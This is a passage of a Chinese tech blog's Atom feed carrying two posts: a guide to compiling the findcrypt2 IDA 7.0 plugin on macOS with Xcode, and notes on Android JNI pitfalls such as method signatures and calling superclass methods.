        &lt;h3 id=&quot;C-类结构以及vtable分析&quot;&gt;&lt;a href=&quot;#C-类结构以及vtable分析&quot; class=&quot;headerlink&quot; title=&quot;C++类结构以及vtable分析&quot;&gt;&lt;/a&gt;C++类结构以及vtable分析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;通过实
      
    
    </summary>
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/C/"/>
    
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>IDA7.0 Mac 插件编译指南v1</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/30/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/30/IDA-Mac-插件编写指南/IDA-Mac-插件编写指南/</id>
    <published>2017-11-30T06:25:09.000Z</published>
    <updated>2019-02-21T09:59:22.403Z</updated>
    
    <content type="html"><![CDATA[<h3 id="先说两句"><a href="#先说两句" class="headerlink" title="先说两句"></a>先说两句</h3><p>前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 32位，因此插件同样为64位的dylib。不仅这样，SDK上某些接口也发生了改变，导致很多优秀的插件不得不重新改动源码，很多在IDA7上编译也存在问题。下面我将以IDA的官方插件findcrypt2来说明IDA7的插件编译细节。编译IDA插件是个麻烦事，主要在于网上相关的资料很少，唯一的几篇也是年代久远，Makefile里面很多编译参数都有变化，目前来说，没有一个完整的文章来介绍如何在Mac平台下编译IDA插件的指南。希望这边文章能够对有这需求的人有所帮助。</p><h3 id="搭建xcode环境"><a href="#搭建xcode环境" class="headerlink" title="搭建xcode环境"></a>搭建xcode环境</h3><p>在Mac上完全可以用xcode来帮助我们编译IDA插件，其实更常见的是用Makefile编译，但原理一样，所以这里就以xcode来介绍。</p><p>我们知道IDA的插件的文件格式为dylib动态库，因此在创建xcode项目时在Framework&amp;Libarry中选择Libarry</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/xcode_step_1.jpg?raw=true" alt="xcode_step_1"></p><p>然后再选择为Dynamic动态库，并导入C++标准库</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/xcode_step_2.jpg?raw=true" alt="xcode_step_2"></p><p>接下来项目中自动会生成两个文件。暂时不用管，我们把findcrypt2的源码放入该项目，最后如下图所示</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/project_1.jpg?raw=true" alt="project_1"></p><p>这时你的项目中像ida.hpp这类的头文件肯定会提示找不到，还需要进一步设置。</p><h3 id="Build-setting"><a href="#Build-setting" class="headerlink" title="Build setting"></a>Build setting</h3><p>这里我们将设置头文件和库的搜索路径等等。</p><p>首先设置目标架构为x86_64</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/arch_s.jpg?raw=true" alt="arch_s"></p><p>然后设置头文件和库的搜索路径，依据你IDA及sdk路径改成对应路径</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/search_s.jpg?raw=true" alt="search_s"></p><p>经过上面的设置，此时xcode应该能找到头文件了，这时还需要设置连接的静态库</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/link_s.jpg?raw=true" alt="link_s"></p><p>这里连接的库为-lida64，表示我们编译的是解析64位的插件，若要编译解析32位的插件，这里为-lida即可。</p><p>最后我们还需要设置编译参数</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/macros_s.jpg?raw=true" alt="macros_s"></p><p>其中<code>__EA64__</code>在编译64位插件时才有。</p><p>这时候build一下，如果一切顺利，应该就不会报错了。</p><h3 id="最后说两句"><a href="#最后说两句" class="headerlink" title="最后说两句"></a>最后说两句</h3><p>IDA7相以前版本而言，插件的后缀名统一为dylib格式，之前32位为pmc，64位为pmc64。这里将编译好的插件改为<strong>findcrypt264.dylib</strong>表示为64位插件，则对应的32位插件名为<strong>findcry.dylib</strong></p><p>下面测试下效果，我们打开IDA去解析一个含有md4加密的macho文件，运行插件测试能否识别出其中的加密算法。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/test.jpg?raw=true" alt="test"></p><p>上图我们可以看到这里成功找到一处md4加密，反汇编窗口中正是md4加密中用到的常量数组。我顺便为插件注册了<strong>Ctrl-Alt-z</strong>的快捷键，若没有快捷键，可以在插件的导航栏里点击对应的插件即可。</p><h3 id="完"><a href="#完" class="headerlink" title="完"></a>完</h3><p>附上该插件，完。</p><p><a href="https://raw.githubusercontent.com/4ch12dy/4ch12dy.github.io/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/findcrypt264.dylib" target="_blank" rel="external">findcrypt264.dylib_for_ida7_made_by_x1a0</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><p><a href="http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html" target="_blank" rel="external">http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html</a></p></li><li><p><a href="http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/" target="_blank" rel="external">http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/</a></p></li><li><p><a href="https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile">https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile</a></p><p>​</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;先说两句&quot;&gt;&lt;a href=&quot;#先说两句&quot; class=&quot;headerlink&quot; title=&quot;先说两句&quot;&gt;&lt;/a&gt;先说两句&lt;/h3&gt;&lt;p&gt;前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 32位，因
      
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
      <category term="ida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ida/"/>
    
  </entry>
  
  <entry>
    <title>Android JNI踩坑笔记</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/28/Android_JNI_%E6%8E%89%E5%9D%91%E7%AC%94%E8%AE%B0%20/JNI/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/28/Android_JNI_掉坑笔记 /JNI/</id>
    <published>2017-11-28T09:00:20.000Z</published>
    <updated>2017-11-29T03:29:43.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>最近项目需要用到jni去实现一些功能，在原生层调用java层的过程中，踩了很多坑，这里做个记录，方便以后查阅，以及如果遇到一些错误，看看有没有这里的坑。</p></blockquote></blockquote><h3 id="坑1–jni方法签名分号问题"><a href="#坑1–jni方法签名分号问题" class="headerlink" title="坑1–jni方法签名分号问题"></a>坑1–jni方法签名分号问题</h3><p>这是一个很常见的问题，第一次写jni中方法签名的时候很容易遇到这个错误，比如下面这个签名</p><pre><code class="c++">jmethodID equals_id = env-&gt;GetMethodID(string_c, &quot;equals&quot;, &quot;(Ljava/lang/Object;)Z&quot;);</code></pre><p>切记当参数或者返回值不是基本类型的时候一定要在末尾加上分号。</p><pre><code class="c++">jmethodID iterator_id = env-&gt;GetMethodID(list_c,&quot;iterator&quot;,&quot;()Ljava/util/Iterator;&quot;);</code></pre><p>这类错误常见描述为方法找不到错误。如果遇到类方法找不到切记先检查方法签名是否正确。</p><h3 id="坑2–原生方法包含默认2个参数"><a href="#坑2–原生方法包含默认2个参数" class="headerlink" title="坑2–原生方法包含默认2个参数"></a>坑2–原生方法包含默认2个参数</h3><p>这个坑当然是对jni使用不熟练造成的，未了解其特性，所以对于初学者来说容易犯。看一个原生函数</p><pre><code class="c++">static jboolean nativeFunction(JNIEnv *env, jobject content, jobject someObj){...}</code></pre><p>第一个保留参数为<code>JNIEnv</code>虚拟机环境变量，第二个为调用该原生方法的java类对象即上下文。这里多说一句，第二个参数的上下文需根据该方法为静态方法还是实例方法，若为静态方法，则这里上下文为类引用；若为实例方法，则上下文为该类的对象引用。若把类引用当做对象引用，在查找方法id时则会出现方法找不到错误。</p><p>由于很多时候不声明这两个参数同样能正确运行（无其他参数时）导致忽略了第二个参数的存在，以为第二个上下文参数为传入的对象引用。</p><p>这类错误常见描述为当你在某处调用这个对象的方法时，会提示找不到该方法。因为这个对象根本不是你传入的对象。</p><h3 id="坑3—jni调用父类方法的正确姿势"><a href="#坑3—jni调用父类方法的正确姿势" class="headerlink" title="坑3—jni调用父类方法的正确姿势"></a>坑3—jni调用父类方法的正确姿势</h3><p>这里就以一个正确的调用父类方法的流程来讲，起因是当我在查找<code>Exception</code>这个类的<code>getStackTrace</code></p><p>方法时提示方法找不到错误，调了会才发现这个方法是在其父类<code>Throwable</code>中，所以正确的写法为：</p><pre><code class="c++">    jclass exception_c = env-&gt;FindClass(&quot;java/lang/Exception&quot;);    jclass throwable_c = env-&gt;FindClass(&quot;java/lang/Throwable&quot;);    jmethodID getStackTrace_id = env-&gt;GetMethodID(throwable_c, &quot;getStackTrace&quot;,&quot;()[Ljava/lang/StackTraceElement;&quot;);</code></pre><p>那么怎么调用呢？用<code>CallNonvirtual&lt;XXX&gt;Method</code>去调用父类中的方法，一个调用例子：</p><pre><code class="c++">jobjectArray stes = (jobjectArray)env-&gt;CallNonvirtualObjectMethod(excep, throwable_c, getStackTrace_id);</code></pre><p>这里需要传入三个参数，第一个为子类的对象引用，第二个为父类类引用，第三个为方法id。</p><h3 id="坑4—其他小坑"><a href="#坑4—其他小坑" class="headerlink" title="坑4—其他小坑"></a>坑4—其他小坑</h3><p>写jni代码时最大的麻烦在于要写很多代码去定位java中的类和方法，java中一个很简单的调用，在jni层写时或许要写很大一堆，这也不奇怪，因为没有了Android虚拟机，这些本来由虚拟机做的事必须得手动去完成。在写jni层代码时，还有一些小的错误，比如<code>jstring</code>与<code>char*</code>的转换，<code>LOGE()</code>函数中参数为<code>char*</code>的字符串。当然还有一些java与C语言类型对应的问题就不多说了，自己翻下<code>jni.h</code>头文件就能找到。</p><p>还有个AndroidStudio的bug在于不能正确的解析jni等头文件，虽然不影响编译，但没有了代码提示以及显示红色看着也挺难受的。网上找到一个解决办法，在对应的<code>build.gradle</code>文件中在<code>defaultConfig{}</code>加入下面的脚本：</p><pre><code class="c">        sourceSets.main{            jni.srcDirs  &#39;/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-mips/usr/include&#39;            jniLibs.srcDir &#39;/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-arm/usr/lib&#39;        }</code></pre><p>无非是手动指定了jni相关的文件路径。</p><p>关于下面两类写法：</p><pre><code class="c++">jclass exception_c = env-&gt;FindClass(&quot;java/lang/Exception&quot;);</code></pre><pre><code class="c">jclass exception_c = (*env)-&gt;FindClass(env, &quot;java/lang/Exception&quot;);</code></pre><p>原因在于C++和C的两种写法，可以在文件中宏定义为C++的即可。</p><h3 id="完"><a href="#完" class="headerlink" title="完"></a>完</h3><p>说了这些坑，当然我都踩过，由于刚接触Android jni特性。所以踩了很多坑，尤其是Android不像iOS那样容易debug，多了一层虚拟机导致很多错误不好调式。说到这，还要吐槽下AndroidStudio的gradle这个项目管理器，各种版本或者莫名奇怪的错误，虽然Xcode同样不是很好用，但相比之下，Xcode省心多了。</p><p>继续踩坑去了…</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;最近项目需要用到jni去实现一些功能，在原生层调用java层的过程中，踩了很多坑，这里做个记录，方便以后查阅，以及如果遇到一些错误，看看有没有这里的坑。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h
      
    
    </summary>
    
    
      <category term="android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"/>
    
  </entry>
  
</feed>
